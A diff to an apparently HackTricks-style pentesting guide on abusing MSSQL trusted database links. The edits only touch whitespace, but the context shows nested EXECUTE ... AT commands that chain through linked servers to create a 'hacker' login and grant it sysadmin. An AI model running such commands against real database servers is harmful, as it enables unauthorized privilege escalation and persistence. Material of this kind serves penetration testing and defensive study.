@@ -2,7 +2,7 @@
 
 ## MSSQL Trusted Links
 
-If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host \(if running as SA\).   
+If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host \(if running as SA\).  
 Also, if a MSSQL instance is trusted \(database link\) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
 
 **The links between databases work even across forest trusts.**
@@ -109,6 +109,4 @@ You can also abuse trusted links using EXECUTE:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-
-
 
